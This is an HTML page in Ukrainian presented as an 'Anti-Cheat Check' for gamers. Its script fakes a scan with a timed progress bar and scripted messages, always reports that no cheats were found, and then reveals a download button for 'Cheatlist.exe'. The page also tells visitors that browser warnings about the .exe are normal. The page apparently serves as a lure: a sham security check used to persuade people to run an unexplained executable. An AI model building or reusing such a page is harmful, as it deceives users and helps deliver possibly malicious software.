<!doctype html>
<html lang="uk">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Anti-Cheat Перевірка</title>
  <style>
    :root { color-scheme: dark; }
    body{
      margin:0; min-height:100vh; display:grid; place-items:center;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
      background: radial-gradient(1200px 600px at 50% 30%, #1b2a3a 0%, #0b0f14 55%, #05070a 100%);
      color:#e8eef7;
    }
    .card{
      width:min(720px, 92vw);
      background: rgba(255,255,255,.06);
      border:1px solid rgba(255,255,255,.10);
      border-radius:18px;
      padding:28px;
      box-shadow: 0 20px 60px rgba(0,0,0,.45);
      backdrop-filter: blur(10px);
    }
    h1{ margin:0 0 6px; font-size: clamp(22px, 4vw, 34px); letter-spacing:.2px; }
    .sub{ opacity:.75; margin:0 0 22px; }
    .row{ display:flex; gap:12px; flex-wrap:wrap; }
    button{
      border:0; border-radius:12px; padding:12px 16px; font-weight:700;
      cursor:pointer; transition: transform .05s ease, opacity .2s ease;
    }
    button:active{ transform: translateY(1px); }
    .btn-check{ background:#ff4d4d; color:#fff; }
    .btn-dl{ background:#2ee59d; color:#07130d; display:none; }
    .btn-check[disabled]{ opacity:.55; cursor:not-allowed; }
    .status{
      margin-top:18px; padding:14px 14px;
      background: rgba(0,0,0,.22);
      border:1px solid rgba(255,255,255,.10);
      border-radius:12px;
      min-height:48px;
      display:flex; align-items:center; gap:10px;
    }
    .dot{
      width:10px; height:10px; border-radius:50%;
      background:#8aa3bd; opacity:.9;
      animation: pulse 1s infinite ease-in-out;
      display:none;
    }
    @keyframes pulse{ 0%,100%{ transform:scale(.9); opacity:.55 } 50%{ transform:scale(1.2); opacity:1 } }
    .bar{
      height:10px; background: rgba(255,255,255,.10);
      border-radius:999px; overflow:hidden; margin-top:14px; display:none;
      border:1px solid rgba(255,255,255,.10);
    }
    .bar > div{
      height:100%; width:0%;
      background: linear-gradient(90deg, #ff4d4d, #2ee59d);
      transition: width .25s ease;
    }
    .note{ margin-top:14px; opacity:.6; font-size:13px; }
    a{ text-decoration:none; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Anti-Cheat Перевірка</h1>
    <p class="sub">Натисни “Перевірити”, дочекайся завершення — потім стане доступне завантаження.</p>

    <div class="row">
      <button class="btn-check" id="checkBtn" onclick="startCheck()">Перевірити на чити</button>

      <a id="dlLink" href="Cheatlist.exe" download>
        <button class="btn-dl" id="downloadBtn">Скачати файл</button>
      </a>
    </div>

    <div class="status" id="statusBox">
      <span class="dot" id="dot"></span>
      <span id="statusText">Готово до перевірки.</span>
    </div>

    <div class="bar" id="bar"><div id="barFill"></div></div>

    <div class="note">⚠️ Якщо браузер попереджає про .exe — це нормально. Можна також викладати файл як .zip.</div>
  </div>

  <script>
    function startCheck(){
      const checkBtn = document.getElementById("checkBtn");
      const downloadBtn = document.getElementById("downloadBtn");
      const statusText = document.getElementById("statusText");
      const dot = document.getElementById("dot");
      const bar = document.getElementById("bar");
      const barFill = document.getElementById("barFill");

      checkBtn.disabled = true;
      downloadBtn.style.display = "none";

      dot.style.display = "inline-block";
      bar.style.display = "block";
      barFill.style.width = "0%";

      const steps = [
        { t: "Сканування процесів…", p: 20 },
        { t: "Перевірка файлів…",    p: 45 },
        { t: "Аналіз памʼяті…",      p: 70 },
        { t: "Фіналізація…",         p: 92 }
      ];

      let i = 0;
      statusText.textContent = "Починаю перевірку…";

      const timer = setInterval(() => {
        if(i < steps.length){
          statusText.textContent = steps[i].t;
          barFill.style.width = steps[i].p + "%";
          i++;
        } else {
          clearInterval(timer);
          barFill.style.width = "100%";
          dot.style.display = "none";
          statusText.textContent = "Перевірка завершена ✅ Чити не виявлено";
          downloadBtn.style.display = "inline-block";
          checkBtn.disabled = false;
          checkBtn.textContent = "Перевірити ще раз";
        }
      }, 700);
    }
  </script>
</body>
</html>
